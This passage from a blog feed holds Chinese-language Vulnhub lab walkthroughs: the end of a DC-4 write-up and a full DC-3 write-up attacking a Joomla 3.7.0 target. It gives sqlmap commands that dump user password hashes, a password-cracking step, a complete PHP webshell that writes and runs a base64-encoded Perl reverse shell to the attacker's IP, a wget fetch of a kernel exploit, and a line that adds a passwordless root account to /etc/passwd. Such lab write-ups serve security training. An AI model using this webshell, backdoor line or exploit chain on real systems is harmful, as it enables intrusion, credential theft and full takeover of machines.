alt="image-20230609134715585"></p><p>可以使用teehee提权，那我们可以用teehee写一些信息到 <code>/etc/passwd</code> 里面</p><blockquote><p>&#x2F;etc&#x2F;passwd 内每个字段的含义</p><p>username:password:User ID:Group ID:comment:home directory:shell</p></blockquote><p>用户名admin，没有密码为管理员权限，进入的时候运行&#x2F;bin&#x2F;bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609135621833.png" alt="image-20230609135621833"></p><h5 id="查找flag"><a href="#查找flag" class="headerlink" title="查找flag"></a>查找flag</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609135811806.png" alt="image-20230609135811806"></p><p>发现flag在 <code>/root</code> 目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609140035724.png" alt="image-20230609140035724"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;一、前期准备&quot;&gt;&lt;a href=&quot;#一、前期准备&quot; class=&quot;headerlink&quot; title=&quot;一、前期准备&quot;&gt;&lt;/a&gt;一、前期准备&lt;/h3&gt;&lt;h4 id=&quot;1-下载地址&quot;&gt;&lt;a href=&quot;#1-下载地址&quot; class=&quot;headerlink&quot; title=&quot;1.下载地址&quot;&gt;&lt;/a&gt;1.下载地址&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://www.vulnhub.com/entry/dc-4,313/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h4 id=&quot;2-利用工具&quot;&gt;&lt;a href=&quot;#2-利用工具&quot; class=&quot;headerlink&quot; title=&quot;2.利用工具&quot;&gt;&lt;/a&gt;2.利用工具&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;网络设置需要修改哦&lt;/p&gt;
&lt;p&gt;kali  桥接模式&lt;/p&gt;
&lt;p&gt;DC-4 桥接模式&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-DC3靶场</title>
    <link href="http://example.com/2023/06/05/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2023/06/05/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/</id>
    <published>2023-06-05T05:34:03.000Z</published>
    <updated>2023-06-15T09:12:48.599Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h3><h4 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1.下载地址"></a>1.下载地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-32,312/</span><br></pre></td></tr></table></figure><h4 id="2-准备工具"><a href="#2-准备工具" class="headerlink" title="2.准备工具"></a>2.准备工具</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali桥接模式192.168.1.49</span><br><span class="line">dc-3桥接模式192.168.1.43</span><br></pre></td></tr></table></figure><h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><p>官网给出的信息</p><blockquote><p>这个靶场与之前的不同，只有一个入口点和一个flag，并且没有任何线索。<br>靶场只需要简单的下载，解压，打开并将其导入到VMware即可</p></blockquote><span id="more"></span><h4 id="1-主机扫描"><a href="#1-主机扫描" class="headerlink" title="1.主机扫描"></a>1.主机扫描</h4><p>扫描同一网段中的IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230612093741121.png" alt="image-20230612093741121"></p><p>发现目标IP</p><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><p>扫描靶机目标，查看目标开放的服务端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -p 1-65535 192.168.1.43</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230613084619194.png" alt="image-20230613084619194"></p><p>通过扫描，发现了一些关键信息</p><h4 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h4><p>在浏览器中输入地址查看，发现是Joomla</p><blockquote><p>Joomla 在海外使用较多，是一套使用 PHP 和 MySQL 开发的开源、跨平台的内容管理系统(CMS)。</p></blockquote><p>在页面中发现是一个登录页面，没有其他敏感信息，使用dirsearch扫描目录</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230613090659008.png" alt="image-20230613090659008"></p><h4 id="4-web页面探测"><a href="#4-web页面探测" class="headerlink" title="4.web页面探测"></a>4.web页面探测</h4><p>在<code>/administrator/index.php</code> 目录下发现后台登录页面</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230613092301105.png" alt="image-20230613092301105"></p><p>打开网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.43</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615141343222.png" alt="image-20230615141343222"></p><h3 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h3><h4 id="1-寻找漏洞"><a href="#1-寻找漏洞" class="headerlink" title="1.寻找漏洞"></a>1.寻找漏洞</h4><blockquote><p>根据提示只有一个flag，并且需要拿到root权限才能得到。并且可以知道网站的CMS系统是Joomla。<a href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a>自带Joomla的扫描命令即Joomscan.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u 192.168.1.43</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615141551861.png" alt="image-20230615141551861"></p><p>发现了cms的版本，版本号：Joomla 3.7.0，还扫出一堆网站目录和后台登录页面</p><p>直接在漏洞库搜索是否有可利用的漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615144218348.png" alt="image-20230615144218348"></p><h4 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h4><p>发现当前cms存在SQL注入漏洞，还有跨站扫描漏洞，我们看一下SQL注入，该漏洞文件地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure><p>查看一下其文件内容</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615144649354.png" alt="image-20230615144649354"></p><p>会发现文件内容已经给出了注入点和SQL注入命令</p><p>列出数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.43/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><p>看了别的博主,他们是这个样子的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.43/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch --dbs</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615145724417.png" alt="image-20230615145724417"></p><p>接下来列出指定数据库的所有表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.43/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch -D &#x27;joomladb&#x27; --tables</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615150052275.png" alt="image-20230615150052275"></p><p>倒数第三个，知道表名</p><p>我们列出所有列名</p><blockquote><p>由于表名含有特殊符号，需要引号包括</p><p>–batch：作用是选项全选yes</p><p>这里就不可以使用–batch参数了，会默认使用公共参数爆破给no掉，导致注入失败，根据提示，手工输入y并回车</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.43/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] -D &#x27;joomladb&#x27; -T &#x27;#__users&#x27; --columns</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615152932157.png" alt="image-20230615152932157"></p><p>查看用户名密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.43/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] -D &#x27;joomladb&#x27; -T &#x27;#__users&#x27; -C name,id,password,username --dump</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615153124097.png" alt="image-20230615153124097"></p><p>拿到用户名和密码</p><blockquote><p>username：admin</p><p>password：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</p></blockquote><h4 id="3-爆破密码"><a href="#3-爆破密码" class="headerlink" title="3.爆破密码"></a>3.爆破密码</h4><p>发现密码是经过加密的</p><p>没有加密函数只能爆破密码了</p><p>利用 <code>john</code> 工具，对密码进行爆破拆解</p><p>现在桌面创建一个文件，将上面的hash密码复制进去并保存，接着使用john工具指向该文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show 文件名</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615154158309.png" alt="image-20230615154158309"></p><blockquote><p>username：admin</p><p>password：snoopy</p></blockquote><p>得到密码尝试后台登录</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615154438614.png" alt="image-20230615154438614"></p><p>进入后台，发现</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615154554254.png" alt="image-20230615154554254"></p><h4 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h4><p>探测后台管理员系统了，发现了文件上传的点位，在Beez3这里</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615154905074.png" alt="image-20230615154905074"></p><p>貌似有文件上传过滤，但是我们可以自己创建一个文件，写入木马，也可以直接反弹shell</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615155210097.png" alt="image-20230615155210097"></p><p>将PHP反弹shell代码复制进去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$path</span> = <span class="title function_ invoke__">execute</span>(<span class="string">&quot;which <span class="subst">$pr</span>&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cfe</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>,<span class="variable">$res</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cfe</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">passthru</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(@<span class="title function_ invoke__">is_resource</span>(<span class="variable">$f</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$cfe</span>,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$f</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> .= @<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">pclose</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$fname</span>,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$text</span>));</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">&quot;192.168.1.49&quot;</span>;</span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">&#x27;6666&#x27;</span>;</span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$back_connect</span>=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">cf</span>(<span class="string">&#x27;/tmp/.bc&#x27;</span>,<span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">which</span>(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615160725110.png" alt="image-20230615160725110"></p><p>写好后，保存上传就好了，根据joomla的特性，模块会单独放在一个文件夹里&#x2F;templates&#x2F;，而beez3模块就在&#x2F;templates&#x2F;beez3&#x2F;里面</p><p>在浏览器地址栏中输入如下代码，执行a.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.43/templates/beez3/a.php</span><br></pre></td></tr></table></figure><p>a.php执行后，即可成功连接</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615163251855.png" alt="image-20230615163251855"></p><p>连接后利用python获取交互shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615161007126.png" alt="image-20230615161007126"></p><h3 id="四、Linux提权"><a href="#四、Linux提权" class="headerlink" title="四、Linux提权"></a>四、Linux提权</h3><h4 id="1-确定操作系统信息"><a href="#1-确定操作系统信息" class="headerlink" title="1.确定操作系统信息"></a>1.确定操作系统信息</h4><p>这不能用suid和git提权，得换种方法，先查看操作系统版本，以寻找提权漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac /etc/issue</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615163634637.png" alt="image-20230615163634637"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615163737693.png" alt="image-20230615163737693"></p><p>得到操作系统与其版本</p><h4 id="2-搜索操作系统漏洞"><a href="#2-搜索操作系统漏洞" class="headerlink" title="2.搜索操作系统漏洞"></a>2.搜索操作系统漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615164103943.png" alt="image-20230615164103943"></p><p>利用通用版本4.4.x版本提权方式，完整path</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615164435252.png" alt="image-20230615164435252"></p><p>文本写的是漏洞产生的原因，描述和漏洞利用的方法，还附上了exp，就是最后一行的连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure><h4 id="3-利用exp提权"><a href="#3-利用exp提权" class="headerlink" title="3.利用exp提权"></a>3.利用exp提权</h4><p>将下载的压缩包放到一个文件夹里，解压得到一个39772的文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip 39772.zip</span><br></pre></td></tr></table></figure><p>进入解压出来的39772文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd 39772</span><br></pre></td></tr></table></figure><p>kali上开启http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 5666</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615165350348.png" alt="image-20230615165350348"></p><p>在dc3靶机中接收39772文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 192.168.1.49:5666/exploit.tar</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170104052.png" alt="image-20230615170104052"></p><p>下载完后用tar命令解压该压缩包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170239773.png" alt="image-20230615170239773"></p><p>cd进入解压后的文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ebpf_mapfd_doubleput_exploit/</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170416760.png" alt="image-20230615170416760"></p><p>执行下两个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170551239.png" alt="image-20230615170551239"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./doubleput</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170707614.png" alt="image-20230615170707614"></p><p>执行完后查看当前用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170815020.png" alt="image-20230615170815020"></p><p>提权成功</p><p>4.查找flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615171118479.png" alt="image-20230615171118479"></p><p>直接查看flag</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615171213766.png" alt="image-20230615171213766"></p>]]></content>
    
    
